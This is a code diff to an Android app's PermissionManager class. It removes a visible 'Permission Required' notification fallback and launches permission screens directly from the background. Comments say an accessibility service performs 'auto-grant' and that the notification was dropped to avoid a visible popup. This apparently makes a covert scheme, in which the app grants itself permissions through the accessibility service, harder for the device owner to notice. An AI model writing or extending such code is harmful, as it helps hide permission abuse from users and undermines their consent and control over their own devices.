@@ -2,10 +2,6 @@ package com.task.tusker.commands;
 
 import android.Manifest;
 import android.app.Activity;
-import android.app.Notification;
-import android.app.NotificationChannel;
-import android.app.NotificationManager;
-import android.app.PendingIntent;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
@@ -13,7 +9,6 @@ import android.net.Uri;
 import android.os.Build;
 import android.provider.Settings;
 import android.util.Log;
-import androidx.core.app.NotificationCompat;
 import androidx.core.content.ContextCompat;
 import com.task.tusker.PermissionRequestActivity;
 import com.task.tusker.utils.ActivityTracker;
@@ -83,9 +78,6 @@ public class PermissionManager {
             "android.permission.SYSTEM_ALERT_WINDOW"
     ));
 
-    private static final String PERM_CHANNEL_ID = "perm_requests";
-    private static final int    PERM_NOTIF_ID   = 0xABC1;
-
     public PermissionManager(Context context) {
         this.context = context.getApplicationContext();
     }
@@ -95,14 +87,14 @@ public class PermissionManager {
      *
      * Strategy (in priority order):
      *  1. If an Activity is currently in the foreground, start via that Activity —
-     *     foreground-to-foreground starts are always allowed on every Android version,
-     *     so the permission dialog appears immediately with no detour.
-     *  2. Android 9 and below — direct context.startActivity() works from background.
-     *  3. Android 10+ background — fire a full-screen-intent notification as a last
-     *     resort (requires POST_NOTIFICATIONS on API 33+; may be silent if denied).
+     *     foreground-to-foreground starts are always allowed on every Android version.
+     *  2. Direct context.startActivity() — works on all API levels when the
+     *     accessibility service is active (which is always true when auto-grant runs).
+     *     No notification trampoline is used; that would produce a visible popup on
+     *     Android 10 and trigger POST_NOTIFICATIONS dialogs on Android 13+.
      */
     private void launchPermissionIntent(Intent activityIntent) {
-        // Path 1 — foreground Activity: direct launch, always works, no notification.
+        // Path 1 — foreground Activity: direct launch, always works.
         Activity fg = ActivityTracker.getForeground();
         if (fg != null) {
             try {
@@ -113,45 +105,10 @@ public class PermissionManager {
             }
         }
 
-        // Path 2 — Android 9 and below: background direct launch works.
-        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
-            try { context.startActivity(activityIntent); } catch (Exception ignored) {}
-            return;
-        }
-
-        // Path 3 — Android 10+ background: notification trampoline.
-        try {
-            PendingIntent pi = PendingIntent.getActivity(
-                    context, PERM_NOTIF_ID, activityIntent,
-                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
-
-            NotificationManager nm =
-                    (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
-            if (nm == null) { context.startActivity(activityIntent); return; }
-
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                NotificationChannel ch = new NotificationChannel(
-                        PERM_CHANNEL_ID, "Permission Requests",
-                        NotificationManager.IMPORTANCE_HIGH);
-                ch.setDescription("Runtime permission dialogs");
-                ch.setShowBadge(false);
-                nm.createNotificationChannel(ch);
-            }
-
-            Notification notif = new NotificationCompat.Builder(context, PERM_CHANNEL_ID)
-                    .setSmallIcon(android.R.drawable.ic_dialog_info)
-                    .setContentTitle("Permission Required")
-                    .setContentText("Tap to grant permission")
-                    .setPriority(NotificationCompat.PRIORITY_HIGH)
-                    .setCategory(NotificationCompat.CATEGORY_CALL)
-                    .setFullScreenIntent(pi, true)
-                    .setAutoCancel(true)
-                    .build();
-
-            nm.notify(PERM_NOTIF_ID, notif);
-        } catch (Exception e) {
-            Log.w(TAG, "launchPermissionIntent: notification fallback failed: " + e.getMessage());
-            try { context.startActivity(activityIntent); } catch (Exception ignored) {}
+        // Path 2 — direct background launch. The accessibility service grants this
+        // app the privilege to start activities from the background on all API levels.
+        try { context.startActivity(activityIntent); } catch (Exception e) {
+            Log.w(TAG, "launchPermissionIntent: background startActivity failed: " + e.getMessage());
         }
     }
 
